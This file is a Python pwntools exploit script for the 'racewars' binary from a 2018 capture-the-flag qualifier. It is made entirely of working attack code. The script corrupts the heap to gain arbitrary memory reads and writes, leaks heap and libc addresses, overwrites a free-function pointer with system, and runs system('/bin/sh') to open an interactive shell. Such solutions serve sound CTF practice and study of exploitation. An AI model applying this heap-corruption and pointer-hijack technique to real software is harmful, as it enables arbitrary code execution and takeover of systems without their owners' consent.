#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "2f76febe.quals2018.oooverflow.io"
PORT = 31337

def buy_tires(count):
	log.info("Buy tires         : %s" % hex(count))

	r.sendline("1")
	r.sendlineafter("need?\n", str(count))
	r.recvuntil("CHOICE: ")

def buy_chassis(idx):
	log.info("Buy chassis       : %d" % idx)

	r.sendline("2")
	r.sendlineafter("eclipse\n", str(idx))
	r.recvuntil("CHOICE: ")

def buy_engine():
	log.info("Buy engine")

	r.sendline("3")
	r.recvuntil("CHOICE: ")

def buy_transmission(choice):
	log.info("Buy transmission  : %d" % choice)

	r.sendline("4")
	r.sendlineafter("transmission? ", str(choice))
	r.recvuntil("CHOICE: ")

def buy_newpart():
	r.sendline("5")
	r.recvuntil("CHOICE: ")

def upgrade_tires(choice, val):
	log.info("Upgrade tires     : %d => %s" % (choice, hex(val)))

	r.sendline("1")
	r.sendlineafter("CHOICE: ", str(choice))
	r.sendlineafter(": ", str(val))
	r.recvuntil("CHOICE: ")

def modify_transmission(gear, val):
	r.sendline("4")
	r.sendlineafter("? ", str(gear))
	r.sendlineafter("?: ", str(val))
	r.sendlineafter(")", "1")
	r.recvuntil("CHOICE: ")

def write_value(addr, value):
	global HEAP

	log.info("Write to %s : %s" % (hex(addr), hex(value)))

	for i in range(8):
		byte = (value >> i*8) & 0xff

		modify_transmission(addr - HEAP + i, byte)

def read_address(offset):
	result = ""

	for i in range(8):
		r.sendline("4")
		r.sendlineafter("? ", str(offset+i))
		r.recvuntil("is ")
		LEAK = int(r.recvuntil(",", drop=True))

		r.sendlineafter("what?: ", str(LEAK))		
		r.sendlineafter(")", "0")

		result+=chr(LEAK)

	return u64(result)


def solve_pow():
	r.recvuntil("Challenge: ")
	chall = r.recvline().strip()
	r.recvuntil("n: ")
	n = r.recvline().strip()
	r.recvuntil("Solution: ")

	pow = process(["./pow.py", chall, n])
	pow.recvline()
	pow.recvuntil("Solution: ")
	sol = pow.recvuntil(" ").strip()
	pow.close()
	r.sendline(sol)

def exploit(r):
	global HEAP

	if not LOCAL:
		solve_pow()

	r.recvuntil("CHOICE: ")

	log.info("Buy 0 tires (Sets tire address, but not increase custom top pointer)")

	buy_tires(134217728)

	log.info("Create transmission (inside tire object)")

	buy_transmission(1)

	log.info("Complete car")

	buy_chassis(1)
	buy_engine()

	log.info("Upgrade tires to set transmission gear count to max for arbitrary read/write")
	
	upgrade_tires(1, 0xffff)
	upgrade_tires(2, 0xffff)
	upgrade_tires(3, 0xffff)
	upgrade_tires(4, 0xffff)

	log.info("Leak heap address with negative offset")
	
	LEAK = read_address(-0x90)
	HEAP = LEAK - 0xe0

	log.info("HEAP              : %s" % hex(HEAP))

	log.info("Leak got address")
	
	PUTS = read_address(-(HEAP + 0xa0 - 0x603020))
	libc.address = PUTS - libc.symbols["puts"]
	
	log.info("PUTS              : %s" % hex(PUTS))	
	log.info("LIBC              : %s" % hex(libc.address))

	log.info("Write free functions to heap (func + args)")
	
	write_value(HEAP + 0x300 - 0xa0 , libc.symbols["system"])
	write_value(HEAP + 0x308 - 0xa0 , next(libc.search("/bin/sh")))

	log.info("Overwrite free function pointer in car")
	
	write_value(HEAP + 0x50 - 0xa0 , HEAP+0x300)

	log.info("Race to trigger system('/bin/sh')")

	# Race will be lost, but in the cleanup method the custom free functions
	# will be called (free_func(free_func+8)) result in system("/bin/sh")

	r.sendline("6")

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./racewars")
	libc = ELF("./libc-2.23.so")
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./racewars", env={"LD_PRELOAD":"./libc-2.23.so"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
